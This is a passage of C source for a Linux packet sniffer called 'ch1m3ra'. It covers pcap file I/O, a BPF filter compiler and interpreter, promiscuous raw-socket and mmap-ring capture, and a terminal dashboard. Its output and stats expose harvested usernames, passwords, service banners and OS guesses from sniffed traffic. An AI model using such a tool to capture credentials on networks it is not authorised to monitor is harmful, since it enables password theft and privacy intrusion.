    if (p->have_dir) fputs(p->outgoing ? "out" : "in", stdout);
    putchar(',');
    csv_str(p->l4name[0] ? p->l4name : p->primary);
    putchar(',');
    csv_str(p->ip_ver ? p->src_s : "");
    putchar(',');
    if (p->has_tcp || p->has_udp) printf("%u", p->sport);
    putchar(',');
    csv_str(p->ip_ver ? p->dst_s : "");
    putchar(',');
    if (p->has_tcp || p->has_udp) printf("%u", p->dport);
    putchar(',');
    printf("%zu,", p->caplen);
    if (p->vlan >= 0) printf("%d", p->vlan);
    putchar(',');

    char info[480];
    info[0] = 0;
    if (p->app_s[0]) snprintf(info, sizeof info, "%s", p->app_s);
    else if (p->has_tcp) snprintf(info, sizeof info, "%s", p->flags_s);
    else if (p->has_icmp)
        snprintf(info, sizeof info, "%s code=%u",
                 p->icmp_ver == 6 ? icmp6_name(p->icmp_type) : icmp4_name(p->icmp_type),
                 p->icmp_code);
    else if (p->has_arp && p->arp_ok)
        snprintf(info, sizeof info, "op=%u %s -> %s", p->arp_op, p->arp_spa, p->arp_tpa);
    if (p->err) lst(info, sizeof info, "%s", p->err);
    csv_str(info);
    putchar(',');
    /* harvested / recon columns (empty when the feature is off) */
    csv_str(p->cred_user);
    putchar(',');
    csv_str(p->cred_pass);
    putchar(',');
    csv_str(p->cred_where);
    putchar(',');
    csv_str(p->banner);
    putchar(',');
    csv_str(p->os_guess);
    putchar('\n');
}

/* dispatch to the selected output format */
static void print_record(const packet_t *p) {
    if (!strcmp(cfg.outfmt, "json")) print_json(p);
    else if (!strcmp(cfg.outfmt, "csv")) print_csv(p);
    else print_pkt(p);
}

static void print_stats(void) {
    fprintf(stderr, "\n%s--- stats ---%s\n", CWHT, C0);
    fprintf(stderr, "packets %llu (%llu bytes)  shown %llu  filtered %llu  malformed %llu\n",
            st.cap, st.bytes, st.shown, st.filtered, st.bad);
    for (int i = 0; i < 8; i++)
        if (st.b[i]) fprintf(stderr, "  %s %llu\n", bucket_name(i), st.b[i]);
    if (st.a[0] || st.a[1] || st.a[2])
        fprintf(stderr, "  dns %llu  tls %llu  http %llu\n", st.a[0], st.a[1], st.a[2]);
    if (cfg.harvest && (st.creds || st.banners))
        fprintf(stderr, "  harvested: %llu credential(s), %llu banner(s)\n",
                st.creds, st.banners);
    if (cfg.names && st.names) fprintf(stderr, "  names learned: %llu\n", st.names);
    streams_stats(stderr);
    finger_stats(stderr);
    talkers_stats(stderr);
    names_stats(stderr);
}

/* ---------- pcap file I/O (own minimal reader/writer) ---------- */
typedef struct { FILE *f; int swap, ns; } pcapin_t;

static uint32_t get32(const uint8_t *d, int swap) {
    uint32_t v = (uint32_t)d[0] | ((uint32_t)d[1] << 8) | ((uint32_t)d[2] << 16) | ((uint32_t)d[3] << 24);
    if (swap) v = __builtin_bswap32(v);
    return v;
}
static void put32(uint8_t *d, uint32_t v) { d[0] = v; d[1] = v >> 8; d[2] = v >> 16; d[3] = v >> 24; }

static int pcapin_open(pcapin_t *p, const char *path) {
    p->f = fopen(path, "rb");
    if (!p->f) { fprintf(stderr, "ch1m3ra: %s: %s\n", path, strerror(errno)); return -1; }
    uint8_t gh[24];
    if (fread(gh, 1, 24, p->f) != 24) {
        fprintf(stderr, "ch1m3ra: %s: short pcap header\n", path); fclose(p->f); return -1;
    }
    uint32_t m = get32(gh, 0);
    p->swap = 0; p->ns = 0;
    switch (m) {
        case 0xa1b2c3d4: break;
        case 0xd4c3b2a1: p->swap = 1; break;
        case 0xa1b23c4d: p->ns = 1; break;
        case 0x4d3cb2a1: p->swap = 1; p->ns = 1; break;
        case 0x0a0d0d0a:
            fprintf(stderr, "ch1m3ra: pcapng not supported - convert with: "
                    "editcap -F pcap in.pcapng out.pcap\n");
            fclose(p->f); return -1;
        default:
            fprintf(stderr, "ch1m3ra: %s: not a pcap file\n", path);
            fclose(p->f); return -1;
    }
    uint32_t link = get32(gh + 20, p->swap);
    if (link != 1) {
        fprintf(stderr, "ch1m3ra: unsupported linktype %u (Ethernet only)\n", link);
        fclose(p->f); return -1;
    }
    return 0;
}
/* 1 = ok, 0 = EOF, -1 = error */
static int pcapin_next(pcapin_t *p, uint8_t *b, size_t bufsz, size_t *cap, size_t *wire,
                       struct timespec *ts) {
    uint8_t rh[16];
    size_t got = fread(rh, 1, 16, p->f);
    if (got == 0 && feof(p->f)) return 0;
    if (got != 16) { fprintf(stderr, "ch1m3ra: truncated pcap record\n"); return -1; }
    uint32_t sec = get32(rh, p->swap);
    uint32_t frac = get32(rh + 4, p->swap);
    uint32_t incl = get32(rh + 8, p->swap);
    uint32_t orig = get32(rh + 12, p->swap);
    if (incl > 0x1000000) { fprintf(stderr, "ch1m3ra: corrupt pcap record (%u bytes)\n", incl); return -1; }
    if (incl > bufsz) { fprintf(stderr, "ch1m3ra: record larger than buffer\n"); return -1; }
    if (fread(b, 1, incl, p->f) != incl) { fprintf(stderr, "ch1m3ra: truncated pcap data\n"); return -1; }
    *cap = incl; *wire = orig;
    ts->tv_sec = sec;
    ts->tv_nsec = p->ns ? frac : (long)frac * 1000;
    return 1;
}

static FILE *open_pcap_write(const char *path) {
    FILE *f = fopen(path, "wb");
    if (!f) { fprintf(stderr, "ch1m3ra: %s: %s\n", path, strerror(errno)); exit(1); }
    static const uint8_t gh[24] = { 0xd4,0xc3,0xb2,0xa1, 2,0, 4,0, 0,0,0,0, 0,0,0,0,
                                    0xff,0xff,0,0, 1,0,0,0 };
    if (fwrite(gh, 1, 24, f) != 24) { fprintf(stderr, "ch1m3ra: write failed\n"); exit(1); }
    return f;
}
static void pcap_write(FILE *f, const uint8_t *b, size_t cap, size_t wire, const struct timespec *ts) {
    uint8_t rh[16];
    put32(rh, (uint32_t)ts->tv_sec);
    put32(rh + 4, (uint32_t)(ts->tv_nsec / 1000));
    put32(rh + 8, (uint32_t)cap);
    put32(rh + 12, (uint32_t)wire);
    if (fwrite(rh, 1, 16, f) != 16 || fwrite(b, 1, cap, f) != cap) {
        fprintf(stderr, "ch1m3ra: write failed\n");
        exit(1);
    }
}

/* ---------- kernel BPF filter (-F) ----------
 * A tcpdump-like expression language is compiled down to classic BPF and
 * attached with SO_ATTACH_FILTER, so the kernel drops non-matching packets
 * before they ever reach userspace.  In -r mode the very same program runs
 * through a tiny interpreter, so -F works offline without root too.
 * Offsets assume plain Ethernet frames (no VLAN tag) and IPv4/IPv6 without
 * extension headers - the usual trade-off of a fast path, documented in the
 * README.                                                                  */

typedef struct bnode bnode_t;
struct bnode {
    int op;                  /* BN_* */
    bnode_t *a, *b;
    uint8_t  cls;            /* BN_TEST: BPF_W / BPF_H / BPF_B */
    uint32_t k, val;         /* BN_TEST: packet offset, compare value */
};
enum { BN_TEST, BN_AND, BN_OR, BN_NOT };

#define BNODES  1024
#define BMAXINS 1024
#define BMAXLAB 128

static bnode_t bn_pool[BNODES];
static int bn_used;

static struct sock_filter b_ins[BMAXINS];
static int b_n;
static int b_lab[BMAXLAB];                 /* label id -> insn index, -1 open */
static int b_lab_next;
static struct { int idx, lab; } b_fix[BMAXINS * 4];
static int b_nfix;
static int b_error;

static bnode_t *bnew(int op) {
    if (bn_used >= BNODES) {
        fprintf(stderr, "ch1m3ra: -F expression too complex\n");
        exit(2);
    }
    bnode_t *n = &bn_pool[bn_used++];
    memset(n, 0, sizeof *n);
    n->op = op;
    return n;
}
static bnode_t *btest(int cls, uint32_t k, uint32_t val) {
    bnode_t *n = bnew(BN_TEST);
    n->cls = (uint8_t)cls; n->k = k; n->val = val;
    return n;
}
static bnode_t *band(bnode_t *a, bnode_t *b) {
    if (!a) return b;
    if (!b) return a;
    bnode_t *n = bnew(BN_AND); n->a = a; n->b = b; return n;
}
static bnode_t *bor(bnode_t *a, bnode_t *b) {
    if (!a) return b;
    if (!b) return a;
    bnode_t *n = bnew(BN_OR); n->a = a; n->b = b; return n;
}
static bnode_t *bnot(bnode_t *a) {
    bnode_t *n = bnew(BN_NOT); n->a = a; return n;
}

/* ---- node builders for each keyword ---- */
static bnode_t *n_et(uint16_t et) { return btest(BPF_H, 12, et); }
static bnode_t *n_proto(int v6, uint8_t p) {
    return band(n_et(v6 ? 0x86dd : 0x0800), btest(BPF_B, v6 ? 20 : 23, p));
}
/* side: 0 = either, 1 = src, 2 = dst */
static bnode_t *n_port(int side, uint32_t port) {
    bnode_t *v4 = band(n_et(0x0800),
                       band(bor(btest(BPF_B, 23, 6), btest(BPF_B, 23, 17)),
                            side == 1 ? btest(BPF_H, 34, port) :
                            side == 2 ? btest(BPF_H, 36, port) :
                                        bor(btest(BPF_H, 34, port), btest(BPF_H, 36, port))));
    bnode_t *v6 = band(n_et(0x86dd),
                       band(bor(btest(BPF_B, 20, 6), btest(BPF_B, 20, 17)),
                            side == 1 ? btest(BPF_H, 54, port) :
                            side == 2 ? btest(BPF_H, 56, port) :
                                        bor(btest(BPF_H, 54, port), btest(BPF_H, 56, port))));
    return bor(v4, v6);
}
static bnode_t *n_host(int side, const uint8_t *addr, int v6) {
    if (!v6) {
        uint32_t w = ((uint32_t)addr[0] << 24) | ((uint32_t)addr[1] << 16) |
                     ((uint32_t)addr[2] << 8) | addr[3];
        bnode_t *src = band(n_et(0x0800), btest(BPF_W, 26, w));
        bnode_t *dst = band(n_et(0x0800), btest(BPF_W, 30, w));
        if (side == 1) return src;
        if (side == 2) return dst;
        return bor(src, dst);
    }
    bnode_t *src = n_et(0x86dd), *dst = n_et(0x86dd);
    for (int i = 0; i < 4; i++) {
        uint32_t w = ((uint32_t)addr[i * 4] << 24) | ((uint32_t)addr[i * 4 + 1] << 16) |
                     ((uint32_t)addr[i * 4 + 2] << 8) | addr[i * 4 + 3];
        src = band(src, btest(BPF_W, (uint32_t)(22 + i * 4), w));
        dst = band(dst, btest(BPF_W, (uint32_t)(38 + i * 4), w));
    }
    if (side == 1) return src;
    if (side == 2) return dst;
    return bor(src, dst);
}
/* DNS is expressed on the wire as a UDP/TCP port 53 test */
static bnode_t *n_dns(void) { return n_port(0, 53); }
static bnode_t *n_proto_name(const char *w) {
    if (!strcasecmp(w, "tcp"))   return bor(n_proto(0, 6), n_proto(1, 6));
    if (!strcasecmp(w, "udp"))   return bor(n_proto(0, 17), n_proto(1, 17));
    if (!strcasecmp(w, "icmp"))  return n_proto(0, 1);
    if (!strcasecmp(w, "icmp6") || !strcasecmp(w, "icmpv6")) return n_proto(1, 58);
    if (!strcasecmp(w, "arp"))   return n_et(0x0806);
    if (!strcasecmp(w, "ip") || !strcasecmp(w, "ip4") || !strcasecmp(w, "ipv4")) return n_et(0x0800);
    if (!strcasecmp(w, "ip6") || !strcasecmp(w, "ipv6")) return n_et(0x86dd);
    if (!strcasecmp(w, "dns") || !strcasecmp(w, "domain")) return n_dns();
    return NULL;
}

/* ---- lexer ---- */
typedef struct { const char *s; char tok[64]; } blex_t;
static int blex(blex_t *L) {
    const char *s = L->s;
    while (*s == ' ' || *s == '\t') s++;
    if (!*s) { L->s = s; L->tok[0] = 0; return 0; }
    if (*s == '(' || *s == ')' || *s == '!') {
        L->tok[0] = *s; L->tok[1] = 0; L->s = s + 1; return 1;
    }
    if ((*s == '&' && s[1] == '&') || (*s == '|' && s[1] == '|')) {
        L->tok[0] = *s; L->tok[1] = *s; L->tok[2] = 0; L->s = s + 2; return 1;
    }
    size_t i = 0;
    while (*s && !strchr(" \t()&|!", *s) && i < sizeof L->tok - 1) L->tok[i++] = *s++;
    L->tok[i] = 0;
    L->s = s;
    return i > 0;
}

/* ---- parser: or := and (('or'|'||') and)*, implicit and between terms ---- */
typedef struct { blex_t L; char cur[64]; int have; } bp_t;
static void berr(const bp_t *P, const char *msg) {
    if (!b_error) fprintf(stderr, "ch1m3ra: -F near \"%s\": %s\n", P->cur, msg);
    b_error = 1;
}
static void badv(bp_t *P) {
    P->have = blex(&P->L);
    memcpy(P->cur, P->L.tok, sizeof P->cur);
}

static bnode_t *bp_or(bp_t *P);

static int bp_number(bp_t *P, const char *what, long lo, long hi, long *out) {
    badv(P);
    if (!P->have || !P->cur[0]) { berr(P, what); return 0; }
    char *end = NULL;
    long v = strtol(P->cur, &end, 10);
    if (!end || *end || v < lo || v > hi) {
        char msg[64];
        snprintf(msg, sizeof msg, "%s must be %ld..%ld", what, lo, hi);
        berr(P, msg);
        return 0;
    }
    *out = v;
    return 1;
}

/* primary terms */
static bnode_t *bp_primary(bp_t *P) {
    int side = 0;
    if (!P->have || !P->cur[0]) { berr(P, "unexpected end of filter"); return NULL; }

    if (!strcasecmp(P->cur, "src") || !strcasecmp(P->cur, "dst")) {
        side = !strcasecmp(P->cur, "src") ? 1 : 2;
        badv(P);
        if (!P->have) { berr(P, "expected port or host after src/dst"); return NULL; }
    }
    if (!strcasecmp(P->cur, "port")) {
        long port;
        if (!bp_number(P, "port", 0, 65535, &port)) return NULL;
        bnode_t *n = n_port(side, (uint32_t)port);
        badv(P);                                  /* move past the number */
        return n;
    }
    if (!strcasecmp(P->cur, "host")) {
        badv(P);
        if (!P->have || !P->cur[0]) { berr(P, "expected address after host"); return NULL; }
        uint8_t addr[16];
        int v6 = 0;
        if (strchr(P->cur, ':')) {
            if (inet_pton(AF_INET6, P->cur, addr) != 1) { berr(P, "bad IPv6 address"); return NULL; }
            v6 = 1;
        } else if (inet_pton(AF_INET, P->cur, addr) != 1) {
            berr(P, "bad IPv4 address");
            return NULL;
        }
        bnode_t *n = n_host(side, addr, v6);
        badv(P);
        return n;
    }
    if (side) { berr(P, "expected port or host after src/dst"); return NULL; }

    bnode_t *n = n_proto_name(P->cur);
    if (!n) { berr(P, "unknown term (tcp udp icmp icmp6 arp ip ip6 port host)"); return NULL; }
    badv(P);
    return n;
}
static bnode_t *bp_not(bp_t *P) {
    if (!P->have || !P->cur[0]) { berr(P, "unexpected end of filter"); return NULL; }
    if (!strcmp(P->cur, "!") || !strcasecmp(P->cur, "not")) {
        badv(P);
        bnode_t *a = bp_not(P);
        return a ? bnot(a) : NULL;
    }
    if (!strcmp(P->cur, "(")) {
        badv(P);
        bnode_t *a = bp_or(P);
        if (!a) return NULL;
        if (!P->have || strcmp(P->cur, ")")) { berr(P, "expected )"); return NULL; }
        badv(P);
        return a;
    }
    return bp_primary(P);
}

static bnode_t *bp_and(bp_t *P) {
    bnode_t *a = bp_not(P);
    if (!a) return NULL;
    for (;;) {
        if (!P->have || !P->cur[0]) break;
        if (!strcmp(P->cur, "and") || !strcmp(P->cur, "&&")) {
            badv(P);
        } else if (!strcmp(P->cur, "or") || !strcmp(P->cur, "||") || !strcmp(P->cur, ")")) {
            break;                               /* handled by the caller */
        } else {
            /* implicit and: next token starts a new term */
        }
        bnode_t *b = bp_not(P);
        if (!b) return NULL;
        a = band(a, b);
    }
    return a;
}

static bnode_t *bp_or(bp_t *P) {
    bnode_t *a = bp_and(P);
    if (!a) return NULL;
    while (P->have && (!strcmp(P->cur, "or") || !strcmp(P->cur, "||"))) {
        badv(P);
        bnode_t *b = bp_and(P);
        if (!b) return NULL;
        a = bor(a, b);
    }
    return a;
}

/* ---- code generation: every branch exit is a forward ja (16-bit), so the
 *      8-bit conditional jump fields are never stretched ---- */
static int blab_new(void) {
    if (b_lab_next >= BMAXLAB) {
        fprintf(stderr, "ch1m3ra: -F expression too complex\n");
        exit(2);
    }
    b_lab[b_lab_next] = -1;
    return b_lab_next++;
}
static void bput(uint8_t code, uint32_t k) {
    if (b_n >= BMAXINS) {
        fprintf(stderr, "ch1m3ra: -F program too large\n");
        exit(2);
    }
    b_ins[b_n].code = code;
    b_ins[b_n].jt = 0;
    b_ins[b_n].jf = 0;
    b_ins[b_n].k = k;
    b_n++;
}
static void bfix(int idx, int lab) {
    b_fix[b_nfix].idx = idx;
    b_fix[b_nfix].lab = lab;
    b_nfix++;
}
static void bpatch_here(int lab) {
    b_lab[lab] = b_n;
    for (int i = 0; i < b_nfix; i++) {
        if (b_fix[i].lab != lab) continue;
        int off = b_lab[lab] - b_fix[i].idx - 1;
        if (off < 0 || off > 0xffff) {
            fprintf(stderr, "ch1m3ra: -F internal: jump out of range\n");
            exit(2);
        }
        b_ins[b_fix[i].idx].k = (uint32_t)off;
        b_fix[i].lab = -1;
    }
}

static void bgen(const bnode_t *n, int lt, int lf) {
    switch (n->op) {
    case BN_AND: {
        int mid = blab_new();
        bgen(n->a, mid, lf);
        bpatch_here(mid);
        bgen(n->b, lt, lf);
        break;
    }
    case BN_OR: {
        int mid = blab_new();
        bgen(n->a, lt, mid);
        bpatch_here(mid);
        bgen(n->b, lt, lf);
        break;
    }
    case BN_NOT:
        bgen(n->a, lf, lt);
        break;
    default:   /* BN_TEST: loads; jeq #val, +1, +0; ja lf; ja lt */
        bput(n->cls == BPF_W ? BPF_LD | BPF_W | BPF_ABS :
             n->cls == BPF_H ? BPF_LD | BPF_H | BPF_ABS :
                               BPF_LD | BPF_B | BPF_ABS, n->k);
        bput(BPF_JMP | BPF_JEQ | BPF_K, n->val);
        b_ins[b_n - 1].jt = 1;                  /* true: skip the long jump */
        int jf = b_n;
        bput(BPF_JMP | BPF_JA, 0);
        bfix(jf, lf);
        int jt = b_n;
        bput(BPF_JMP | BPF_JA, 0);
        bfix(jt, lt);
        break;
    }
}

static void bpf_compile(const char *expr) {
    bp_t P;
    memset(&P, 0, sizeof P);
    P.L.s = expr;
    bn_used = 0; b_n = 0; b_nfix = 0; b_lab_next = 0; b_error = 0;
    badv(&P);
    bnode_t *root = bp_or(&P);
    if (b_error) exit(2);
    if (!root) { fprintf(stderr, "ch1m3ra: empty -F expression\n"); exit(2); }
    if (P.have && P.cur[0]) {
        fprintf(stderr, "ch1m3ra: -F trailing junk: \"%s\"\n", P.cur);
        exit(2);
    }
    int lt = blab_new(), lf = blab_new();
    bgen(root, lt, lf);
    bpatch_here(lt);
    bput(BPF_RET | BPF_K, 0xffffffff);          /* accept */
    bpatch_here(lf);
    bput(BPF_RET | BPF_K, 0);                   /* drop */
}

static void bpf_attach(int fd) {
    struct sock_fprog fp;
    fp.len = (unsigned short)b_n;
    fp.filter = b_ins;
    if (setsockopt(fd, SOL_SOCKET, SO_ATTACH_FILTER, &fp, sizeof fp) < 0) {
        fprintf(stderr, "ch1m3ra: cannot attach BPF filter: %s\n", strerror(errno));
        exit(1);
    }
}

/* classic-BPF interpreter for -r mode; only the forms we emit are supported */
static int bpf_run(const uint8_t *data, uint32_t len) {
    uint32_t A = 0;
    unsigned pc = 0, steps = 0;
    while (pc < (unsigned)b_n) {
        if (++steps > 1000000u) return 0;        /* defensive: no loops emitted */
        const struct sock_filter *i = &b_ins[pc];
        uint8_t cl = (uint8_t)(i->code & 0x07);
        if (cl == BPF_RET) return i->k != 0;
        if (cl == BPF_LD) {
            uint32_t k = i->k;
            uint8_t sz = (uint8_t)(i->code & 0x18);
            uint32_t need = sz == BPF_W ? 4 : sz == BPF_H ? 2 : 1;
            if (k + need > len) return 0;        /* truncated: no match */
            if (sz == BPF_W)
                A = ((uint32_t)data[k] << 24) | ((uint32_t)data[k + 1] << 16) |
                    ((uint32_t)data[k + 2] << 8) | data[k + 3];
            else if (sz == BPF_H)
                A = ((uint32_t)data[k] << 8) | data[k + 1];
            else
                A = data[k];
            pc++;
            continue;
        }
        if (cl == BPF_JMP) {
            if (i->code == (BPF_JMP | BPF_JA)) { pc += i->k + 1; continue; }
            if (i->code == (BPF_JMP | BPF_JEQ | BPF_K)) {
                pc += (A == i->k ? i->jt : i->jf) + 1;
                continue;
            }
            return 0;
        }
        return 0;                                /* anything else: not emitted */
    }
    return 0;
}

/* ---------- live capture ---------- */
static void list_ifaces(void) {
    struct ifaddrs *ifa, *p;
    if (getifaddrs(&ifa) != 0) { perror("getifaddrs"); exit(1); }
    printf("%-16s %-22s %-18s %s\n", "IFACE", "STATE", "MAC", "ADDR");
    for (p = ifa; p; p = p->ifa_next) {
        if (!p->ifa_name || !p->ifa_addr || p->ifa_addr->sa_family != AF_PACKET) continue;
        const struct sockaddr_ll *s = (const struct sockaddr_ll *)p->ifa_addr;
        char mac[24] = "-";
        if (s->sll_halen == 6)
            snprintf(mac, sizeof mac, "%02x:%02x:%02x:%02x:%02x:%02x",
                     s->sll_addr[0], s->sll_addr[1], s->sll_addr[2],
                     s->sll_addr[3], s->sll_addr[4], s->sll_addr[5]);
        char state[40] = "";
        snprintf(state, sizeof state, "%s", (p->ifa_flags & IFF_UP) ? "up" : "down");
        if (p->ifa_flags & IFF_RUNNING) strncat(state, ",running", sizeof state - strlen(state) - 1);
        if (p->ifa_flags & IFF_LOOPBACK) strncat(state, ",loopback", sizeof state - strlen(state) - 1);
        if (p->ifa_flags & IFF_PROMISC) strncat(state, ",promisc", sizeof state - strlen(state) - 1);
        char addr[INET6_ADDRSTRLEN] = "";
        for (struct ifaddrs *q = ifa; q; q = q->ifa_next) {
            if (q->ifa_name && !strcmp(q->ifa_name, p->ifa_name) &&
                q->ifa_addr && q->ifa_addr->sa_family == AF_INET) {
                struct sockaddr_in *in = (struct sockaddr_in *)q->ifa_addr;
                inet_ntop(AF_INET, &in->sin_addr, addr, sizeof addr);
                break;
            }
        }
        printf("%-16s %-22s %-18s %s\n", p->ifa_name, state, mac, addr);
    }
    freeifaddrs(ifa);
}

static int open_live(const char *iface, int *ifindex_out) {
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) {
        fprintf(stderr, "ch1m3ra: socket(AF_PACKET): %s\n", strerror(errno));
        if (errno == EPERM)
            fprintf(stderr, "ch1m3ra: needs root - run from your Kali Root Terminal, or:\n"
                            "         sudo setcap cap_net_raw,cap_net_admin+ep ./ch1m3ra\n");
        exit(1);
    }
    int ifindex = 0;
    if (iface) {
        ifindex = (int)if_nametoindex(iface);
        if (!ifindex) {
            fprintf(stderr, "ch1m3ra: no such interface: %s (use -l to list)\n", iface);
            exit(1);
        }
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof sll);
        sll.sll_family = AF_PACKET;
        sll.sll_protocol = htons(ETH_P_ALL);
        sll.sll_ifindex = ifindex;
        if (bind(fd, (struct sockaddr *)&sll, sizeof sll) < 0) {
            fprintf(stderr, "ch1m3ra: bind %s: %s\n", iface, strerror(errno));
            exit(1);
        }
        if (!cfg.nopromisc) {
            struct packet_mreq mr;
            memset(&mr, 0, sizeof mr);
            mr.mr_ifindex = ifindex;
            mr.mr_type = PACKET_MR_PROMISC;
            if (setsockopt(fd, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &mr, sizeof mr) < 0)
                fprintf(stderr, "ch1m3ra: warning: no promiscuous mode: %s\n", strerror(errno));
        }
    }
    *ifindex_out = ifindex;
    if (cfg.tui) {
        /* non-blocking so the TUI can poll keys between packets */
        int fl = fcntl(fd, F_GETFL, 0);
        if (fl >= 0) fcntl(fd, F_SETFL, fl | O_NONBLOCK);
    }
    return fd;
}

/* ---------- zero-copy ring capture (-Z, TPACKET_V2) ----------
 * Instead of recvfrom() copying every packet into a userspace buffer, the
 * kernel writes frames straight into a shared mmap ring; we parse in place
 * and hand the frame pointers to the decoder - no copy per packet.        */
static uint8_t *ring_map;
static size_t ring_len;
static struct tpacket_req ring_req;
static int ring_on;

static int ring_setup(int fd) {
    int ver = TPACKET_V2;
    if (setsockopt(fd, SOL_PACKET, PACKET_VERSION, &ver, sizeof ver) < 0) {
        fprintf(stderr, "ch1m3ra: warning: PACKET_VERSION: %s (falling back to recvfrom)\n",
                strerror(errno));
        return -1;
    }
    /* frames must be a power of two >= snaplen + headers so they tile the
     * 2 MiB block exactly (kernel requires block_nr * block/frame == frame_nr) */
    size_t need = (size_t)cfg.snaplen + 512;
    size_t fsz = 2048;
    while (fsz < need) fsz <<= 1;
    size_t blk = 1u << 21;                       /* 2 MiB blocks */
    if (fsz > blk) { fprintf(stderr, "ch1m3ra: snaplen too large for ring\n"); return -1; }
    ring_req.tp_block_size = (unsigned)blk;
    ring_req.tp_block_nr = 48;                   /* 96 MiB mapped */
    ring_req.tp_frame_size = (unsigned)fsz;
    ring_req.tp_frame_nr = (unsigned)(ring_req.tp_block_nr * (blk / fsz));
    if (setsockopt(fd, SOL_PACKET, PACKET_RX_RING, &ring_req, sizeof ring_req) < 0) {
        fprintf(stderr, "ch1m3ra: warning: PACKET_RX_RING: %s (falling back to recvfrom)\n",
                strerror(errno));
        return -1;
    }
    ring_len = (size_t)ring_req.tp_block_nr * blk;
    ring_map = mmap(NULL, ring_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (ring_map == MAP_FAILED) {
        fprintf(stderr, "ch1m3ra: warning: mmap ring: %s (falling back to recvfrom)\n",
                strerror(errno));
        ring_map = NULL;
        /* undo the ring so recvfrom still works */
        struct tpacket_req off = {0};
        setsockopt(fd, SOL_PACKET, PACKET_RX_RING, &off, sizeof off);
        return -1;
    }
    ring_on = 1;
    return 0;
}

/* fetch the next frame; blocks via poll.  returns 1 = packet, 0 = stop.
 * The previous frame is released only when the next one is requested, so
 * the caller can decode in place without racing the kernel's writer.      */
static int ring_next(int fd, uint8_t **pkt, size_t *cap, size_t *wire,
                     struct timespec *ts, int *have_dir, int *out, char *ifn) {
    static struct tpacket2_hdr *last_h;
    static size_t scan_off;
    const size_t bsz = ring_req.tp_block_size;
    const size_t fsz = ring_req.tp_frame_size;
    (void)bsz;

    for (;;) {
        if (last_h) {                            /* done decoding the old one */
            __atomic_store_n(&last_h->tp_status, (uint32_t)TP_STATUS_KERNEL,
                             __ATOMIC_RELEASE);
            last_h = NULL;
        }
        for (size_t off = 0; off < ring_len; off += fsz) {
            size_t o = (scan_off + off) < ring_len ? scan_off + off : (scan_off + off) - ring_len;
            struct tpacket2_hdr *h = (struct tpacket2_hdr *)(ring_map + o);
            if (!(h->tp_status & TP_STATUS_USER)) continue;

            *pkt = ring_map + o + h->tp_mac;
            *cap = h->tp_snaplen;
            *wire = h->tp_len;
            ts->tv_sec = (time_t)h->tp_sec;
            ts->tv_nsec = (long)h->tp_nsec;
            struct sockaddr_ll *sll = (struct sockaddr_ll *)
                ((uint8_t *)h + TPACKET2_HDRLEN - sizeof(struct sockaddr_ll));
            *have_dir = 1;
            *out = (sll->sll_pkttype == PACKET_OUTGOING);
            if (!if_indextoname(sll->sll_ifindex, ifn))
                snprintf(ifn, IF_NAMESIZE, "if%d", sll->sll_ifindex);

            last_h = h;                          /* release on the next call */
            scan_off = o + fsz;
            if (scan_off >= ring_len) scan_off = 0;
            return 1;
        }
        /* ring empty: sleep until the kernel says there is data (briefly, so
         * the TUI can service keys; a full wait in plain capture mode) */
        struct pollfd p = { .fd = fd, .events = POLLIN };
        int rc = poll(&p, 1, cfg.tui ? 100 : -1);
        if (rc == 0 && cfg.tui) return 2;        /* timeout: no frame yet */
        if (rc < 0) {
            if (errno == EINTR) {
                if (g_stop) return 0;
                continue;
            }
            fprintf(stderr, "ch1m3ra: poll: %s\n", strerror(errno));
            return 0;
        }
    }
}

static void ring_stats(int fd) {
    if (!ring_on) return;
    struct tpacket_stats s;
    socklen_t sl = sizeof s;
    memset(&s, 0, sizeof s);
    if (getsockopt(fd, SOL_PACKET, PACKET_STATISTICS, &s, &sl) == 0 && s.tp_drops)
        fprintf(stderr, "  kernel : %u packet(s) dropped by the ring buffer\n", s.tp_drops);
}

/* ---------- interactive TUI (-U) ----------
 * Full-screen dashboard driven in the same process as the capture: keys are
 * polled between packets, and the capture source is only read while running
 * so "stop" is instant.  Raw termios + ANSI escapes, no ncurses.           */
#define TUI_LOGMAX 4096

/* capture source context; defined in full in the capture-source section */
typedef struct {
    pcapin_t  pr;
    FILE     *wf;
    int       fd;
    int       ifindex;
    int       pcap_mode;
    int       started;      /* source opened and reading */
} cap_t;

static cap_t cap;

static int  capture_next(uint8_t *buf, size_t bufsz, const uint8_t **frame_out,
                         size_t *cap_out, size_t *wire, struct timespec *ts,
                         int *have_dir, int *out, char *ifn);
static int  process_frame(const uint8_t *frame, size_t capn, size_t wire,
                          const struct timespec *ts, const char *ifn,
                          int have_dir, int out);

static struct {
    int      running;        /* capture active (start/stop via s / x) */
    int      logn;           /* entries used */
    int      loghead;        /* next overwrite slot */
    int      scroll;         /* 0 = follow tail, >0 = lines back from tail */
    int      follow_on;      /* -T all-streams toggle from the TUI */
    int      panel;          /* 0 packets, 1 hits, 2 hosts, 3 talkers */
    int      hitn, hithead;  /* credential/banner "hits" ring */
    char    *line[TUI_LOGMAX];
    char    *hit[TUI_LOGMAX];
} tui;

static struct termios tui_saved;
static int tui_raw;

static void tui_enter_raw(void) {
    if (!isatty(STDIN_FILENO)) return;
    if (tcgetattr(STDIN_FILENO, &tui_saved) != 0) return;
    struct termios t = tui_saved;
    t.c_lflag &= ~(ICANON | ECHO);
    t.c_cc[VMIN] = 0;
    t.c_cc[VTIME] = 0;
    tcsetattr(STDIN_FILENO, TCSANOW, &t);
    tui_raw = 1;
}
static void tui_leave_raw(void) {
    if (tui_raw) { tcsetattr(STDIN_FILENO, TCSANOW, &tui_saved); tui_raw = 0; }
}
static void tui_term_restore(void) {
    tui_leave_raw();
    fputs("\x1b[?25h\x1b[?1049l", stdout);   /* cursor on, leave alt screen */
    fflush(stdout);
}
static void tui_panic(int sig) { (void)sig; tui_term_restore(); _exit(128); }

/* push one formatted log line (oldest overwritten once the ring is full) */
static void tui_logf(const char *fmt, ...) {
    char buf[512];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof buf, fmt, ap);
    va_end(ap);
    free(tui.line[tui.loghead]);
    tui.line[tui.loghead] = strdup(buf);
    tui.loghead = (tui.loghead + 1) % TUI_LOGMAX;
    if (tui.logn < TUI_LOGMAX) tui.logn++;
    if (tui.scroll) tui.scroll++;   /* hold position while scrolled back */
}

/* push an "interesting" line into the hits panel (creds/banners/os) */
static void tui_hitf(const char *fmt, ...) {
    char buf[512];
